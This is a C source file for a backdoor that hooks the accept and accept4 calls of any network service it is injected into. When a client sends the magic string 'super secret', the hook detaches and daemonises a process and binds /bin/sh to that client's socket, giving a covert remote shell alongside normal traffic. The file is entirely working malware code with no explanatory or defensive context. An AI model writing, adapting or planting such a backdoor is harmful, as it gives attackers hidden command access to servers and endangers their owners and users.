#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include "fook.h"

#define MAGIC "super secret\n"

void spawn_shell(int childsock);

FOOK_HOOK(accept);
FOOK_HOOK(accept4);
int (*orig_accept)(int,void*,void*) = NULL;
int (*orig_accept4)(int,void*,void*,int) = NULL;

FOOK_EXPORT int my_accept( int sockfd,void*addr,void *addrlen){
    FOOK_ENTER(accept);
    int ret = orig_accept(sockfd,addr,addrlen);
    FOOK_RETURN(accept);

    char buf[1024] = {0};
    ssize_t len = recv(ret, &buf, 1024, MSG_PEEK);

    if ( len == strlen(MAGIC) ) {
        if (strncmp(buf, MAGIC,strlen(MAGIC)) == 0 ) {
            recv(ret,buf,len,0);
            pid_t pid = fork();
            if (pid > 0) {
                close(ret);
                return orig_accept(sockfd,addr,addrlen);
            } else {
                spawn_shell(ret);
            }
        }
    }

    return ret;
}

FOOK_EXPORT int my_accept4( int sockfd,void*addr,void *addrlen,int flag){

    FOOK_ENTER(accept4);
    int ret = orig_accept4(sockfd,addr,addrlen,flag);
    FOOK_RETURN(accept4);

    char buf[1024] = {0};
    ssize_t len = recv(ret, &buf, 1024, MSG_PEEK);

    if ( len == strlen(MAGIC) ) {
        if (strncmp(buf, MAGIC,strlen(MAGIC)) == 0 ) {
            recv(ret,buf,len,0);
            pid_t pid = fork();
            if (pid > 0) {
                close(ret);
                return orig_accept4(sockfd,addr,addrlen,flag);
            } else {
                spawn_shell(ret);
            }
        }
    }
    return ret;
}

FOOK_INIT void fook() {
    FOOK_ADD_TRAMPOLINE( accept , my_accept );
    FOOK_ADD_TRAMPOLINE( accept4 , my_accept4 );
}


void spawn_shell(int child){
    int i, maxfd;
    if(fork() != 0) {
            signal(SIGCHLD, SIG_IGN);
            signal(SIGPIPE, SIG_DFL);
            close(child);
            exit(0);
    }

    if(setsid() < 0) return;
    if(fork() != 0) exit(0);
    wait(NULL);
    chdir("/");
    umask(0);
    maxfd = sysconf(_SC_OPEN_MAX);
    for(i=0; i<maxfd; i++) {
        if( i != child ) close(i);
    }

    dup2(child,0);
    dup2(child,1);
    dup2(child,2);
    execl( "/bin/sh", "/bin/sh", NULL );
    exit(0);
}